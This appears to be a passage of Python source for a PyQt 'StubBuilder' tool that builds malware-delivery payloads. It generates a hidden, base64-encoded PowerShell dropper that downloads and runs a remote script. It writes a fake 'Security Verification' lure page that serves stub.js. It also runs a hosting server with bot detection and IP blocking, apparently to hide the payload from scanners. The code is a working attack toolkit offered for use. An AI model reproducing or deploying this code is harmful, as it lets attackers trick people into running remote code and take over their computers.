                    background: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #10b981, stop:1 #059669);
                    color: white;
                    border: none;
                    border-radius: 12px;
                    font-weight: 700;
                    font-size: 12pt;
                    padding: 0 40px;
                    min-height: 56px;
                }
                QPushButton:hover {
                    background: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #059669, stop:1 #047857);
                }
            """)
    
    def toggle_advanced_command(self, checked):
        if checked:
            url = self.custom_url_input.text().strip()
            if not url:
                QMessageBox.warning(self, "Missing URL", "Please enter a Custom URL (PowerShell script URL) before enabling Advanced Base64 Dropper.")
                self.advanced_cmd_check.setChecked(False)
                return
            # Save current command to restore later
            self.saved_command = self.command_input.text()
            self.advanced_active = True
            # Escape single quotes in URL
            url_escaped = url.replace("'", "''")
            ps_script = f"IEX (New-Object Net.WebClient).DownloadString('{url_escaped}')"
            encoded = base64.b64encode(ps_script.encode('utf-16le')).decode('ascii')
            advanced_cmd = f"powershell -ExecutionPolicy Bypass -w hidden -enc {encoded}"
            self.command_input.setText(advanced_cmd)
        else:
            if self.advanced_active:
                self.command_input.setText(self.saved_command if self.saved_command else DEFAULT_CONFIG["command"])
                self.advanced_active = False
    
    def on_custom_url_changed(self):
        """If advanced mode is active, regenerate the command when custom URL changes."""
        if self.advanced_cmd_check.isChecked():
            url = self.custom_url_input.text().strip()
            if url:
                url_escaped = url.replace("'", "''")
                ps_script = f"IEX (New-Object Net.WebClient).DownloadString('{url_escaped}')"
                encoded = base64.b64encode(ps_script.encode('utf-16le')).decode('ascii')
                advanced_cmd = f"powershell -ExecutionPolicy Bypass -w hidden -enc {encoded}"
                self.command_input.setText(advanced_cmd)
            else:
                self.command_input.setText("")
        
    def browse_block_file(self):
        filename, _ = QFileDialog.getOpenFileName(self, "Select Block List File", "", "Text Files (*.txt)")
        if filename:
            self.block_file_path.setText(filename)
            # Optionally load rules from file into text area
            try:
                with open(filename, 'r') as f:
                    content = f.read()
                    current = self.block_rules_input.toPlainText()
                    if current.strip():
                        new_content = current + "\n" + content
                    else:
                        new_content = content
                    self.block_rules_input.setPlainText(new_content)
            except Exception as e:
                QMessageBox.warning(self, "Error", f"Could not load file: {e}")
        
    def update_config_from_ui(self):
        self.config["command"] = self.command_input.text()
        self.config["custom_url_execute"] = self.custom_url_input.text()
        # Update blocking config
        self.config["blocking"]["enabled"] = self.enable_blocking.isChecked()
        rules_text = self.block_rules_input.toPlainText().strip()
        self.config["blocking"]["rules"] = [r.strip() for r in rules_text.split('\n') if r.strip()]
        self.config["blocking"]["file"] = self.block_file_path.text().strip()
        self.config["server"]["host"] = self.server_host.text()
        self.config["server"]["port"] = self.server_port.value()
        
    def load_config_to_ui(self):
        self.command_input.setText(self.config.get("command", ""))
        self.custom_url_input.setText(self.config.get("custom_url_execute", ""))
        # Load blocking
        blocking = self.config.get("blocking", {})
        self.enable_blocking.setChecked(blocking.get("enabled", True))
        self.block_rules_input.setPlainText("\n".join(blocking.get("rules", [])))
        self.block_file_path.setText(blocking.get("file", ""))
        self.server_host.setText(self.config.get("server", {}).get("host", "0.0.0.0"))
        self.server_port.setValue(self.config.get("server", {}).get("port", 8080))
        
    def save_config(self):
        self.update_config_from_ui()
        filename, _ = QFileDialog.getSaveFileName(self, "Save Config", "config.json", "JSON Files (*.json)")
        if filename:
            with open(filename, 'w') as f:
                json.dump(self.config, f, indent=2)
            self.log(f"Config saved: {filename}")
            
    def load_config(self):
        filename, _ = QFileDialog.getOpenFileName(self, "Load Config", "", "JSON Files (*.json)")
        if filename:
            try:
                with open(filename, 'r') as f:
                    self.config = json.load(f)
                self.load_config_to_ui()
                self.log(f"Config loaded: {filename}")
            except Exception as e:
                QMessageBox.critical(self, "Error", str(e))
                
    def build_payload(self):
        self.update_config_from_ui()
        
        if self.current_mode == "portable":
            self.build_portable()
        else:
            self.switch_page(1)  # Go to VPS page
            
    def build_portable(self):
        directory = QFileDialog.getExistingDirectory(self, "Select Output Directory")
        if not directory:
            return
            
        try:
            # Generate files
            stub_path = os.path.join(directory, "stub.js")
            stub_content = generate_stub_file(self.config, EMBEDDED_JS, EMBEDDED_CSS, EMBEDDED_HTML)
            with open(stub_path, 'w', encoding='utf-8') as f:
                f.write(stub_content)
            
            html_path = os.path.join(directory, "index.html")
            html_content = generate_inlined_html(self.config, EMBEDDED_JS, EMBEDDED_CSS, EMBEDDED_HTML)
            with open(html_path, 'w', encoding='utf-8') as f:
                f.write(html_content)
            
            # Combined
            combined_path = os.path.join(directory, "payload.html")
            combined_html = f'''<!DOCTYPE html>
<html>
<head>
    <title>Security Verification</title>
    <style>
        body {{ background: #0f172a; color: #e2e8f0; font-family: system-ui; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
        .container {{ background: #1e293b; padding: 40px; border-radius: 16px; text-align: center; max-width: 500px; border: 1px solid #334155; }}
        .btn {{ background: #3b82f6; color: white; border: none; padding: 16px 32px; border-radius: 8px; cursor: pointer; font-size: 12pt; margin: 8px; font-weight: 600; }}
        .btn:hover {{ background: #2563eb; transform: translateY(-2px); }}
        .btn-secondary {{ background: #10b981; }}
        .btn-secondary:hover {{ background: #059669; }}
    </style>
</head>
<body>
    <div class="container">
        <h2>🔒 Security Verification</h2>
        <p style="color: #94a3b8; margin: 20px 0;">Choose deployment method</p>
        <button class="btn" onclick="run()">Run Now</button>
        <button class="btn btn-secondary" onclick="dl()">Download stub.js</button>
    </div>
    <script>
        const JS = `{stub_content.replace('`', '\\`')}`;
        function run() {{ document.write('<script>'+JS+'<\\/script>'); document.close(); }}
        function dl() {{ const b = new Blob([JS], {{type: 'application/javascript'}}); const u = URL.createObjectURL(b); const a = document.createElement('a'); a.href=u; a.download='stub.js'; a.click(); }}
    </script>
</body>
</html>'''
            
            with open(combined_path, 'w', encoding='utf-8') as f:
                f.write(combined_html)
            
            self.log(f"✅ Portable build successful!")
            self.log(f"   📄 {stub_path}")
            self.log(f"   🌐 {html_path}")
            self.log(f"   🚀 {combined_path}")
            
            QMessageBox.information(self, "Success", f"3 files generated in:\n{directory}")
            
        except Exception as e:
            QMessageBox.critical(self, "Error", str(e))
            
    def toggle_vps_server(self):
        if self.server_thread and self.server_thread.running:
            self.server_thread.stop()
            self.server_thread = None
            self.vps_server_btn.setText("▶️ START VPS SERVER")
            self.server_status.setText("⭕ Server Offline")
            self.log("VPS Server stopped")
        else:
            self.update_config_from_ui()
            
            report_dir = os.path.join(os.path.expanduser("~"), "StubBuilder_Reports")
            
            self.server_thread = ServerThread(self.config, EMBEDDED_JS, EMBEDDED_CSS, EMBEDDED_HTML, mode="vps")
            # Pass blocking config
            blocker_config = self.config.get("blocking", {})
            self.server_thread.set_vps_mode(report_dir, self.auto_block_check.isChecked(), blocker_config)
            self.server_thread.log_signal.connect(self.handle_vps_log)
            self.server_thread.start()
            
            self.vps_server_btn.setText("⏹️ STOP VPS SERVER")
            self.server_status.setText("🟢 Server Online")
            self.log(f"VPS Server starting on port {self.config['server']['port']}")
            self.log(f"Reports saving to: {report_dir}")
            
    def quick_block_vps(self):
        ip = self.block_input.text().strip()
        if not ip:
            return
            
        if self.server_thread and self.server_thread.running:
            self.server_thread.block_ip(ip)
            self.blocked_list.addItem(f"⛔ {ip} - Manually blocked")
            self.block_input.clear()
            self.log(f"Blocked IP: {ip}")
        else:
            QMessageBox.warning(self, "Server Offline", "Start VPS server first")
            
    def clear_blocked_list(self):
        self.blocked_list.clear()
        if self.server_thread and self.server_thread.ip_blocker:
            pass
            
    def handle_vps_log(self, message):
        self.log(message)
        
        # Update stats if it contains request info
        if "ALLOWED" in message or "BLOCKED" in message:
            self.update_vps_stats()
            
    def update_vps_stats(self):
        # Parse stats from server thread if available
        if self.server_thread and self.server_thread.report_gen:
            attempts = len(self.server_thread.report_gen.attempts)
            blocked = len(self.server_thread.report_gen.blocked_ips)
            bots = sum(1 for a in self.server_thread.report_gen.attempts if a['type'] == 'BOT')
            
            self.vps_stat_requests.findChildren(QLabel)[1].setText(str(attempts))
            self.vps_stat_blocked.findChildren(QLabel)[1].setText(str(blocked))
            self.vps_stat_bots.findChildren(QLabel)[1].setText(str(bots))
            
    def open_report_folder(self):
        report_dir = os.path.join(os.path.expanduser("~"), "StubBuilder_Reports")
        if not os.path.exists(report_dir):
            os.makedirs(report_dir)
        os.startfile(report_dir) if os.name == 'nt' else os.system(f'open "{report_dir}"')
        
    def refresh_report_preview(self):
        report_dir = os.path.join(os.path.expanduser("~"), "StubBuilder_Reports")
        if os.path.exists(report_dir):
            files = [f for f in os.listdir(report_dir) if f.endswith('.html')]
            if files:
                latest = max(files, key=lambda x: os.path.getctime(os.path.join(report_dir, x)))
                with open(os.path.join(report_dir, latest), 'r') as f:
                    content = f.read()
                    self.report_preview.setPlainText(content[:5000] + "..." if len(content) > 5000 else content)
                self.log(f"Loaded report: {latest}")
            else:
                self.report_preview.setPlainText("No reports found yet...")
        else:
            self.report_preview.setPlainText("Reports folder not created yet...")
        
    def log(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_output.append(f"[{timestamp}] {message}")
        
    def closeEvent(self, event):
        if self.server_thread and self.server_thread.running:
            self.server_thread.stop()
        event.accept()


def main():
    app = QApplication(sys.argv)
    force_dark_theme(app)
    default_font = QFont("Segoe UI", 10)
    app.setFont(default_font)
    
    app.setStyleSheet("""
        QToolTip {
            background-color: #1e293b;
            color: #f1f5f9;
            border: 1px solid #334155;
            border-radius: 6px;
            padding: 8px;
            font-size: 9pt;
        }
        QRadioButton::indicator {
            width: 18px;
            height: 18px;
            border-radius: 9px;
        }
        QRadioButton::indicator::unchecked {
            border: 2px solid #475569;
            background: #0f172a;
        }
        QRadioButton::indicator::checked {
            border: 2px solid #3b82f6;
            background: #3b82f6;
        }
        QCheckBox::indicator {
            width: 18px;
            height: 18px;
            border-radius: 4px;
        }
        QCheckBox::indicator:unchecked {
            border: 2px solid #475569;
            background: #0f172a;
        }
        QCheckBox::indicator:checked {
            border: 2px solid #3b82f6;
            background: #3b82f6;
        }
    """)
    window = BuilderWindow()
    window.show()
    sys.exit(app.exec())


if __name__ == "__main__":
    main()